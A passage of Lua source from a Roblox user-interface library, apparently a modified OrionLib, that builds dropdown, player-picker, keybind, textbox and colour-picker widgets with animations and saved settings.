							ImageColor3 = Color3.fromRGB(240, 240, 240),
							Name = "Ico"
						}), "TextDark"),
						AddThemeObject(SetProps(MakeElement("Label", "Selected", 13), {
							Size = UDim2.new(1, -40, 1, 0),
							Font = Enum.Font.Gotham,
							Name = "Selected",
							TextXAlignment = Enum.TextXAlignment.Right
						}), "TextDark"),
						AddThemeObject(SetProps(MakeElement("Frame"), {
							Size = UDim2.new(1, 0, 0, 1),
							Position = UDim2.new(0, 0, 1, -1),
							Name = "Line",
							Visible = false
						}), "Stroke"), 
						Click
					}), {
						Size = UDim2.new(1, 0, 0, 38),
						ClipsDescendants = true,
						Name = "F"
					}),
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
					MakeElement("Corner")
				}), "Second")
				-- Registrar elemento para pesquisa (COM refer�ncia do Frame)
				table.insert(SearchableElements, {
					Name = DropdownConfig.Name,
					TabName = TabConfig.Name,
					Type = "Dropdown",
					Frame = DropdownFrame
				})

				AddConnection(DropdownList:GetPropertyChangedSignal("AbsoluteContentSize"), function()
					DropdownContainer.CanvasSize = UDim2.new(0, 0, 0, DropdownList.AbsoluteContentSize.Y)
				end)  

				local function AddOptions(Options)
					for _, Option in pairs(Options) do
						local OptionBtn = AddThemeObject(SetProps(SetChildren(MakeElement("Button", Color3.fromRGB(40, 40, 40)), {
							MakeElement("Corner", 0, 6),
							AddThemeObject(SetProps(MakeElement("Label", Option, 13, 0.4), {
								Position = UDim2.new(0, 8, 0, 0),
								Size = UDim2.new(1, -8, 1, 0),
								Name = "Title"
							}), "Text")
						}), {
							Parent = DropdownContainer,
							Size = UDim2.new(1, 0, 0, 28),
							BackgroundTransparency = 1,
							ClipsDescendants = true
						}), "Divider")

						AddConnection(OptionBtn.MouseButton1Click, function()
							Dropdown:Set(Option)
							SaveCfg(game.GameId)
						end)

						Dropdown.Buttons[Option] = OptionBtn
					end
				end	

				function Dropdown:Refresh(Options, Delete)
					if Delete then
						for _,v in pairs(Dropdown.Buttons) do
							v:Destroy()
						end    
						table.clear(Dropdown.Options)
						table.clear(Dropdown.Buttons)
					end
					Dropdown.Options = Options
					AddOptions(Dropdown.Options)
				end  

				function Dropdown:Set(Value)
					if not table.find(Dropdown.Options, Value) then
						Dropdown.Value = "..."
						DropdownFrame.F.Selected.Text = Dropdown.Value
						for _, v in pairs(Dropdown.Buttons) do
							TweenService:Create(v,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
							TweenService:Create(v.Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
						end	
						return
					end

					Dropdown.Value = Value
					DropdownFrame.F.Selected.Text = Dropdown.Value

					for _, v in pairs(Dropdown.Buttons) do
						TweenService:Create(v,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
						TweenService:Create(v.Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
					end	
					TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
					TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
					return DropdownConfig.Callback(Dropdown.Value)
				end

				AddConnection(Click.MouseButton1Click, function()
					Dropdown.Toggled = not Dropdown.Toggled
					DropdownFrame.F.Line.Visible = Dropdown.Toggled
					TweenService:Create(DropdownFrame.F.Ico,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Rotation = Dropdown.Toggled and 180 or 0}):Play()
					if #Dropdown.Options > MaxElements then
						TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (MaxElements * 28)) or UDim2.new(1, 0, 0, 38)}):Play()
					else
						TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, DropdownList.AbsoluteContentSize.Y + 38) or UDim2.new(1, 0, 0, 38)}):Play()
					end
				end)

				Dropdown:Refresh(Dropdown.Options, false)
				Dropdown:Set(Dropdown.Value)
				if DropdownConfig.Flag then				
					OrionLib.Flags[DropdownConfig.Flag] = Dropdown
				end

				return Dropdown
			end

			function ElementFunction:AddPlayerDropdown(Config)
				Config = Config or {}
				Config.Name     = Config.Name     or "PlayerDropdown"
				Config.Default  = Config.Default  or nil
				Config.Callback = Config.Callback or function() end
				Config.Flag     = Config.Flag     or nil
				Config.Save     = Config.Save     or false

				local Dropdown = {
					Value           = Config.Default,
					Buttons         = {},
					SelectedPlayers = {},
					Toggled         = false,
					Type            = "PlayerDropdown",
					Save            = Config.Save,
				}
				local MaxElements = 5

				local ButtonColor   = Color3.fromRGB(35, 0, 60)
				local SelectedColor = Color3.fromRGB(55, 0, 95)

				local DropdownList = MakeElement("List")
				local DropdownContainer = AddThemeObject(
					SetProps(
						SetChildren(
							MakeElement("ScrollFrame", Color3.fromRGB(40, 40, 40), 4),
							{ DropdownList }
						),
						{
							Parent           = ItemParent,
							Position         = UDim2.new(0, 0, 0, 38),
							Size             = UDim2.new(1, 0, 1, -38),
							ClipsDescendants = true,
						}
					),
					"Divider"
				)

				local Click = SetProps(MakeElement("Button"), {
					Size                   = UDim2.new(1, 0, 1, 0),
					BackgroundTransparency = 1,
					AutoButtonColor        = false,
					Name                   = "ClickRegion",
				})

				local DropdownFrame = AddThemeObject(
					SetChildren(
						SetProps(
							MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5),
							{ Size = UDim2.new(1, 0, 0, 38), Parent = ItemParent, ClipsDescendants = true }
						),
						{
							DropdownContainer,
							SetProps(
								SetChildren(MakeElement("TFrame"), {
									AddThemeObject(
										SetProps(MakeElement("Label", Config.Name, 15), {
											Size      = UDim2.new(1, -12, 1, 0),
											Position  = UDim2.new(0, 12, 0, 0),
											Font      = Enum.Font.GothamBold,
											Name      = "Content",
										}),
										"Text"
									),
									AddThemeObject(
										SetProps(MakeElement("Image", "rbxassetid://7072706796"), {
											Size        = UDim2.new(0, 20, 0, 20),
											AnchorPoint = Vector2.new(0, 0.5),
											Position    = UDim2.new(1, -30, 0.5, 0),
											ImageColor3 = Color3.fromRGB(240, 240, 240),
											Name        = "Ico",
										}),
										"TextDark"
									),
									AddThemeObject(
										SetProps(MakeElement("Label", "Selecione", 13), {
											Size           = UDim2.new(1, -40, 1, 0),
											Font           = Enum.Font.Gotham,
											Name           = "Selected",
											TextXAlignment = Enum.TextXAlignment.Right,
										}),
										"TextDark"
									),
									SetProps(MakeElement("Frame"), {
										Size     = UDim2.new(1, 0, 0, 1),
										Position = UDim2.new(0, 0, 1, -1),
										Name     = "Line",
										Visible  = false,
									}),
									Click,
								}),
								{
									Size             = UDim2.new(1, 0, 0, 38),
									ClipsDescendants = true,
									Name             = "F",
								}
							),
							AddThemeObject(MakeElement("Stroke"), "Stroke"),
							MakeElement("Corner"),
						}
					),
					"Second"
				)

				AddConnection(DropdownList:GetPropertyChangedSignal("AbsoluteContentSize"), function()
					DropdownContainer.CanvasSize = UDim2.new(0, 0, 0, DropdownList.AbsoluteContentSize.Y)
				end)

				AddConnection(Click.MouseButton1Click, function()
					Dropdown.Toggled = not Dropdown.Toggled
					DropdownFrame.F.Line.Visible = Dropdown.Toggled
					TweenService:Create(
						DropdownFrame.F.Ico,
						TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{ Rotation = Dropdown.Toggled and 180 or 0 }
					):Play()
					local targetHeight = 38
					if Dropdown.Toggled then
						local listHeight = math.min(DropdownList.AbsoluteContentSize.Y, MaxElements * 40)
						targetHeight = 38 + listHeight
					end
					TweenService:Create(
						DropdownFrame,
						TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{ Size = UDim2.new(1, 0, 0, targetHeight) }
					):Play()
				end)

				local function AddOptions(playerList)
					for _, player in ipairs(playerList) do
						local OptionBtn = SetProps(
							MakeElement("Button"),
							{
								Parent               = DropdownContainer,
								Size                 = UDim2.new(1, 0, 0, 40),
								BackgroundColor3     = ButtonColor,
								BackgroundTransparency = 0,
								AutoButtonColor      = false,
								ClipsDescendants     = true,
							}
						)
						AddThemeObject(SetProps(Instance.new("UIStroke"), {
							Parent = OptionBtn,
							ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
							Color = Color3.fromRGB(20, 20, 20),
							Thickness = 1,
							Transparency = 0.2,
						}), "Divider")
						MakeElement("Corner", 0, 6).Parent = OptionBtn

						local thumbUrl = string.format(
							"https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
							player.UserId
						)
						SetProps(MakeElement("Image", thumbUrl), {
							Parent = OptionBtn,
							Size = UDim2.new(0, 30, 0, 30),
							Position = UDim2.new(0, 5, 0, 5),
							BackgroundTransparency = 1,
							Name = "Thumb",
						})

						AddThemeObject(
							SetProps(MakeElement("Label", player.DisplayName, 14), {
								Parent = OptionBtn,
								Position = UDim2.new(0, 42, 0, 5),
								Size = UDim2.new(0.6, -10, 0, 18),
								Font = Enum.Font.GothamBold,
								TextXAlignment = Enum.TextXAlignment.Left,
								Name = "DisplayName",
							}),
							"Text"
						)

						AddThemeObject(
							SetProps(MakeElement("Label", player.Name, 12), {
								Parent = OptionBtn,
								Position = UDim2.new(0, 42, 0, 22),
								Size = UDim2.new(0.6, -10, 0, 18),
								Font = Enum.Font.Gotham,
								TextXAlignment = Enum.TextXAlignment.Left,
								Name = "UserName",
							}),
							"TextDark"
						)

						AddConnection(OptionBtn.MouseButton1Click, function()
							if Dropdown.SelectedPlayers[player] then
								Dropdown.SelectedPlayers[player] = nil
							else
								Dropdown.SelectedPlayers[player] = true
							end
							Dropdown:Set()
							if Config.Save then SaveCfg(game.GameId) end
						end)

						Dropdown.Buttons[player] = OptionBtn
					end
				end

				function Dropdown:Refresh(list, clear)
					if clear then
						for _, btn in pairs(self.Buttons) do btn:Destroy() end
						table.clear(self.Buttons)
					end
					AddOptions(list)
				end

				function Dropdown:Set()
					local selectedUsernames = {}
					for p in pairs(self.SelectedPlayers) do
						if PlayerService:FindFirstChild(p.Name) then
							table.insert(selectedUsernames, p.Name)
						else
							self.SelectedPlayers[p] = nil
						end
					end

					-- Atualiza texto do dropdown com os nomes selecionados
					if #selectedUsernames > 0 then
						DropdownFrame.F.Selected.Text = table.concat(selectedUsernames, ", ")
					else
						DropdownFrame.F.Selected.Text = "Selecione"
					end

					-- Atualiza as cores dos botões
					for p, btn in pairs(self.Buttons) do
						btn.BackgroundColor3 = self.SelectedPlayers[p] and SelectedColor or ButtonColor
					end

					return Config.Callback(selectedUsernames)
				end

				local function updateList()
					local allPlayers = PlayerService:GetPlayers()
					local filtered = {}
					for _, p in ipairs(allPlayers) do
						if p ~= PlayerService.LocalPlayer then
							table.insert(filtered, p)
						end
					end
					Dropdown:Refresh(filtered, true)
					Dropdown:Set() -- Atualiza interface após recarregar
				end

				PlayerService.PlayerAdded:Connect(updateList)
				PlayerService.PlayerRemoving:Connect(updateList)

				updateList()
				if Config.Flag then OrionLib.Flags[Config.Flag] = Dropdown end
				return Dropdown
			end

			function ElementFunction:AddBind(BindConfig)
				BindConfig.Name = BindConfig.Name or "Bind"
				BindConfig.Default = BindConfig.Default or Enum.KeyCode.Unknown
				BindConfig.Hold = BindConfig.Hold or false
				BindConfig.Callback = BindConfig.Callback or function() end
				BindConfig.Flag = BindConfig.Flag or nil
				BindConfig.Save = BindConfig.Save or false

				local Bind = {Value, Binding = false, Type = "Bind", Save = BindConfig.Save}
				local Holding = false

				local Click = SetProps(MakeElement("Button"), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local BindBox = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
					Size = UDim2.new(0, 24, 0, 24),
					Position = UDim2.new(1, -12, 0.5, 0),
					AnchorPoint = Vector2.new(1, 0.5)
				}), {
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
					AddThemeObject(SetProps(MakeElement("Label", BindConfig.Name, 14), {
						Size = UDim2.new(1, 0, 1, 0),
						Font = Enum.Font.GothamBold,
						TextXAlignment = Enum.TextXAlignment.Center,
						Name = "Value"
					}), "Text")
				}), "Main")

				local BindFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement("Label", BindConfig.Name, 15), {
						Size = UDim2.new(1, -12, 1, 0),
						Position = UDim2.new(0, 12, 0, 0),
						Font = Enum.Font.GothamBold,
						Name = "Content"
					}), "Text"),
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
					BindBox,
					Click
				}), "Second")

				AddConnection(BindBox.Value:GetPropertyChangedSignal("Text"), function()
					--BindBox.Size = UDim2.new(0, BindBox.Value.TextBounds.X + 16, 0, 24)
					TweenService:Create(BindBox, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, BindBox.Value.TextBounds.X + 16, 0, 24)}):Play()
				end)

				AddConnection(Click.InputEnded, function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseButton1 then
						if Bind.Binding then return end
						Bind.Binding = true
						BindBox.Value.Text = ""
					end
				end)

				AddConnection(UserInputService.InputBegan, function(Input)
					if UserInputService:GetFocusedTextBox() then return end
					if (Input.KeyCode.Name == Bind.Value or Input.UserInputType.Name == Bind.Value) and not Bind.Binding then
						if BindConfig.Hold then
							Holding = true
							BindConfig.Callback(Holding)
						else
							BindConfig.Callback()
						end
					elseif Bind.Binding then
						local Key
						pcall(function()
							if not CheckKey(BlacklistedKeys, Input.KeyCode) then
								Key = Input.KeyCode
							end
						end)
						pcall(function()
							if CheckKey(WhitelistedMouse, Input.UserInputType) and not Key then
								Key = Input.UserInputType
							end
						end)
						Key = Key or Bind.Value
						Bind:Set(Key)
						pcall(function()
							SaveCfg(game.GameId)
						end)
					end
				end)

				AddConnection(UserInputService.InputEnded, function(Input)
					if Input.KeyCode.Name == Bind.Value or Input.UserInputType.Name == Bind.Value then
						if BindConfig.Hold and Holding then
							Holding = false
							BindConfig.Callback(Holding)
						end
					end
				end)

				AddConnection(Click.MouseEnter, function()
					TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
				end)

				AddConnection(Click.MouseLeave, function()
					TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
				end)

				AddConnection(Click.MouseButton1Up, function()
					TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
				end)

				AddConnection(Click.MouseButton1Down, function()
					TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
				end)

				function Bind:Set(Key)
					Bind.Binding = false
					Bind.Value = Key or Bind.Value
					Bind.Value = Bind.Value.Name or Bind.Value
					BindBox.Value.Text = Bind.Value
				end

				Bind:Set(BindConfig.Default)
				if BindConfig.Flag then				
					OrionLib.Flags[BindConfig.Flag] = Bind
				end
				
				-- Registrar Bind para pesquisa
				table.insert(SearchableElements, {
					Name = BindConfig.Name,
					TabName = TabConfig.Name,
					Type = "Bind",
					Frame = BindFrame
				})
				
				return Bind
			end

			function ElementFunction:AddTextbox(TextboxConfig)
				TextboxConfig = TextboxConfig or {}
				TextboxConfig.Name = TextboxConfig.Name or "Textbox"
				TextboxConfig.Default = TextboxConfig.Default or ""
				TextboxConfig.TextDisappear = TextboxConfig.TextDisappear or false
				TextboxConfig.Callback = TextboxConfig.Callback or function() end

				local Click = SetProps(MakeElement("Button"), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				local TextboxActual = AddThemeObject(Create("TextBox", {
					Size = UDim2.new(1, 0, 1, 0),
					BackgroundTransparency = 1,
					TextColor3 = Color3.fromRGB(255, 255, 255),
					PlaceholderColor3 = Color3.fromRGB(210,210,210),
					PlaceholderText = "Input",
					Font = Enum.Font.GothamSemibold,
					TextXAlignment = Enum.TextXAlignment.Center,
					TextSize = 14,
					ClearTextOnFocus = false
				}), "Text")

				local TextContainer = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
					Size = UDim2.new(0, 24, 0, 24),
					Position = UDim2.new(1, -12, 0.5, 0),
					AnchorPoint = Vector2.new(1, 0.5)
				}), {
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
					TextboxActual
				}), "Main")


				local TextboxFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent
				}), {
					AddThemeObject(SetProps(MakeElement("Label", TextboxConfig.Name, 15), {
						Size = UDim2.new(1, -12, 1, 0),
						Position = UDim2.new(0, 12, 0, 0),
						Font = Enum.Font.GothamBold,
						Name = "Content"
					}), "Text"),
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
					TextContainer,
					Click
				}), "Second")

				AddConnection(TextboxActual:GetPropertyChangedSignal("Text"), function()
					--TextContainer.Size = UDim2.new(0, TextboxActual.TextBounds.X + 16, 0, 24)
					TweenService:Create(TextContainer, TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, TextboxActual.TextBounds.X + 16, 0, 24)}):Play()
				end)

				AddConnection(TextboxActual.FocusLost, function()
					TextboxConfig.Callback(TextboxActual.Text)
					if TextboxConfig.TextDisappear then
						TextboxActual.Text = ""
					end	
				end)

				TextboxActual.Text = TextboxConfig.Default

				AddConnection(Click.MouseEnter, function()
					TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
				end)

				AddConnection(Click.MouseLeave, function()
					TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
				end)

				AddConnection(Click.MouseButton1Up, function()
					TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
					TextboxActual:CaptureFocus()
				end)

				AddConnection(Click.MouseButton1Down, function()
					TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
				end)
				
				-- Registrar Textbox para pesquisa
				table.insert(SearchableElements, {
					Name = TextboxConfig.Name,
					TabName = TabConfig.Name,
					Type = "Textbox",
					Frame = TextboxFrame
				})
			end

			function ElementFunction:AddColorpicker(ColorpickerConfig)
				ColorpickerConfig = ColorpickerConfig or {}
				ColorpickerConfig.Name = ColorpickerConfig.Name or "Colorpicker"
				ColorpickerConfig.Default = ColorpickerConfig.Default or Color3.fromRGB(255,255,255)
				ColorpickerConfig.Callback = ColorpickerConfig.Callback or function() end
				ColorpickerConfig.Flag = ColorpickerConfig.Flag or nil
				ColorpickerConfig.Save = ColorpickerConfig.Save or false

				-- Inicializar HSV com a cor padrão
				local H, S, V = Color3.toHSV(ColorpickerConfig.Default)
				local ColorH, ColorS, ColorV = H, S, V
				local Colorpicker = {Value = ColorpickerConfig.Default, Toggled = false, Type = "Colorpicker", Save = ColorpickerConfig.Save}
				local ColorpickerFrame  -- Declarar antes para registrar depois

				local ColorSelection = Create("ImageLabel", {
					Size = UDim2.new(0, 18, 0, 18),
					Position = UDim2.new(S, 0, 1 - V, 0),
					ScaleType = Enum.ScaleType.Fit,
					AnchorPoint = Vector2.new(0.5, 0.5),
					BackgroundTransparency = 1,
					Image = "http://www.roblox.com/asset/?id=4805639000"
				})

				local HueSelection = Create("ImageLabel", {
					Size = UDim2.new(0, 18, 0, 18),
					Position = UDim2.new(0.5, 0, 1 - H, 0),
					ScaleType = Enum.ScaleType.Fit,
					AnchorPoint = Vector2.new(0.5, 0.5),
					BackgroundTransparency = 1,
					Image = "http://www.roblox.com/asset/?id=4805639000"
				})

				local Color = Create("ImageLabel", {
					Size = UDim2.new(1, -25, 1, 0),
					Visible = false,
					Image = "rbxassetid://4155801252"
				}, {
					Create("UICorner", {CornerRadius = UDim.new(0, 5)}),
					ColorSelection
				})

				local Hue = Create("Frame", {
					Size = UDim2.new(0, 20, 1, 0),
					Position = UDim2.new(1, -20, 0, 0),
					Visible = false
				}, {
					Create("UIGradient", {Rotation = 270, Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(0.20, Color3.fromRGB(234, 255, 0)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(21, 255, 0)), ColorSequenceKeypoint.new(0.60, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.80, Color3.fromRGB(0, 17, 255)), ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 0, 251)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 4))},}),
					Create("UICorner", {CornerRadius = UDim.new(0, 5)}),
					HueSelection
				})

				local ColorpickerContainer = Create("Frame", {
					Position = UDim2.new(0, 0, 0, 32),
					Size = UDim2.new(1, 0, 1, -32),
					BackgroundTransparency = 1,
					ClipsDescendants = true
				}, {
					Hue,
					Color,
					Create("UIPadding", {
						PaddingLeft = UDim.new(0, 35),
						PaddingRight = UDim.new(0, 35),
						PaddingBottom = UDim.new(0, 10),
						PaddingTop = UDim.new(0, 17)
					})
				})

				local Click = SetProps(MakeElement("Button"), {
					Size = UDim2.new(1, 0, 1, 0)
				})

				-- COLORPICKER BOX MELHORADO )
				local ColorpickerBox = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 8), {
					Size = UDim2.new(0, 28, 0, 28),
					Position = UDim2.new(1, -16, 0.5, 0),
					AnchorPoint = Vector2.new(1, 0.5)
				}), {
					AddThemeObject(SetProps(MakeElement("Stroke"), {
						Thickness = 2.5,
						Transparency = 0.3
					}), "Stroke"),
					-- Glow effect
					Create("ImageLabel", {
						Size = UDim2.new(1, 20, 1, 20),
						Position = UDim2.new(0.5, 0, 0.5, 0),
						AnchorPoint = Vector2.new(0.5, 0.5),
						BackgroundTransparency = 1,
						Image = "rbxassetid://5028857084",
						ImageColor3 = Color3.fromRGB(255, 255, 255),
						ImageTransparency = 0.7,
						ZIndex = 0
					})
				}), "Main")

				ColorpickerFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
					Size = UDim2.new(1, 0, 0, 38),
					Parent = ItemParent
				}), {
					SetProps(SetChildren(MakeElement("TFrame"), {
						AddThemeObject(SetProps(MakeElement("Label", ColorpickerConfig.Name, 15), {
							Size = UDim2.new(1, -12, 1, 0),
							Position = UDim2.new(0, 12, 0, 0),
							Font = Enum.Font.GothamBold,
							Name = "Content"
						}), "Text"),
						ColorpickerBox,
						Click,
						AddThemeObject(SetProps(MakeElement("Frame"), {
							Size = UDim2.new(1, 0, 0, 1),
							Position = UDim2.new(0, 0, 1, -1),
							Name = "Line",
							Visible = false
						}), "Stroke"), 
					}), {
						Size = UDim2.new(1, 0, 0, 38),
						ClipsDescendants = true,
						Name = "F"
					}),
					ColorpickerContainer,
					AddThemeObject(MakeElement("Stroke"), "Stroke"),
				}), "Second")

				-- COLORPICKER ANIMATION
				local isAnimating = false
				
				AddConnection(Click.MouseButton1Click, function()
					if isAnimating then return end
					isAnimating = true
					
					Colorpicker.Toggled = not Colorpicker.Toggled
					
					if Colorpicker.Toggled then
						-- Open
						Color.Visible = true
						Hue.Visible = true
						ColorpickerFrame.F.Line.Visible = true
						
						TweenService:Create(ColorpickerFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
							Size = UDim2.new(1, 0, 0, 160)
						}):Play()
						TweenService:Create(Color, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {ImageTransparency = 0}):Play()
						TweenService:Create(Hue, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
						
						task.wait(0.3)
					else
						-- Close
						TweenService:Create(Color, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {ImageTransparency = 1}):Play()
						TweenService:Create(Hue, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
						TweenService:Create(ColorpickerFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
							Size = UDim2.new(1, 0, 0, 38)
						}):Play()
						
						task.wait(0.2)
						Color.Visible = false
						Hue.Visible = false
						ColorpickerFrame.F.Line.Visible = false
					end
					
					isAnimating = false
				end)

				local lastUpdateTime = 0
				local updateDebounce = 0.05  -- Update max 20 times per second
				
				local function UpdateColorPicker()
					local currentTime = tick()
					if currentTime - lastUpdateTime < updateDebounce then
						return
					end
					lastUpdateTime = currentTime
					
					local newColor = Color3.fromHSV(ColorH, ColorS, ColorV)
					Colorpicker.Value = newColor
					ColorpickerBox.BackgroundColor3 = newColor
					Color.BackgroundColor3 = Color3.fromHSV(ColorH, 1, 1)
					ColorpickerConfig.Callback(newColor)
					SaveCfg(game.GameId)  -- Debounced automatically by SaveCfg
				end
				
				local Dragging, DragInput, MousePos, FramePos = false

				AddConnection(Color.InputBegan, function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
						Dragging = true
						MousePos = Input.Position
						FramePos = ColorSelection.Position
		
						AddConnection(Input.Changed, function()
							if Input.UserInputState == Enum.UserInputState.End then
								Dragging = false
								FocusDrag = nil
							end
						end)
					end
				end)

				AddConnection(Color.InputChanged, function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch and not FocusDrag then
						DragInput = Input
						FocusDrag = DragInput
					end
				end)
				
				AddConnection(UserInputService.InputChanged, function(Input)
					if Input == DragInput and Dragging and Input == FocusDrag then
						local ColorX = (math.clamp(DragInput.Position.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) / Color.AbsoluteSize.X)
						local ColorY = (math.clamp(Input.Position.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) / Color.AbsoluteSize.Y)
						ColorSelection.Position = UDim2.new(ColorX, 0, ColorY, 0)
						ColorS = ColorX
						ColorV = 1 - ColorY
						UpdateColorPicker()
					end
				end)

				-- Hue

				local Dragging_1, DragInput_1, MousePos_1, FramePos_1 = false

				AddConnection(Hue.InputBegan, function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
						Dragging_1 = true
						MousePos_1 = Input.Position
						FramePos_1 = HueSelection.Position
		
						AddConnection(Input.Changed, function()
							if Input.UserInputState == Enum.UserInputState.End then
								Dragging_1 = false
								FocusDrag = nil
							end
						end)
					end
				end)
				AddConnection(Hue.InputChanged, function(Input)
					if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch and not FocusDrag then
						DragInput_1 = Input
						FocusDrag = DragInput_1
					end
				end)
				
				AddConnection(UserInputService.InputChanged, function(Input)
					if Input == DragInput_1 and Dragging_1 and DragInput_1 == FocusDrag then
						local HueY = (math.clamp(Input.Position.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) / Hue.AbsoluteSize.Y)
						HueSelection.Position = UDim2.new(0.5, 0, HueY, 0)
						ColorH = 1 - HueY
						UpdateColorPicker()
					end
				end)

